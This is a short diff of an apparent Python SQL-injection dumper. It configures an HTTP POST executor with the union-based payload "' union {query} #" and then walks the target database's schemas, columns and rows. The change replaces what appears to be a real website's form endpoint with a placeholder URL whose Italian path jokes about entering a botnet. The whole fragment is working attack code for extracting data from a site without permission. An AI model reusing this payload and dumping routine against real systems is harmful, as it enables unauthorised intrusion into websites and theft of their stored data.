@@ -95,8 +95,8 @@ def intersperse(lst, item):
 
 
 from dumper import *
-if __name__ == "__main__":#'http://se.mettiamo.quello.vero/entriamo/in/una/botnet'
-    db = HTTPPostRawResponseExecutor("http://ediproject.me/forms.php","' union {query} #",6,6,None)
+if __name__ == "__main__":#
+    db = HTTPPostRawResponseExecutor('http://se.mettiamo.quello.vero/entriamo/in/una/botnet',"' union {query} #",6,6,None)
     schemas = grep_schemas(db)
     schemas = grep_column_structures(db,schemas)
     schemas = grep_rows(db,schemas)
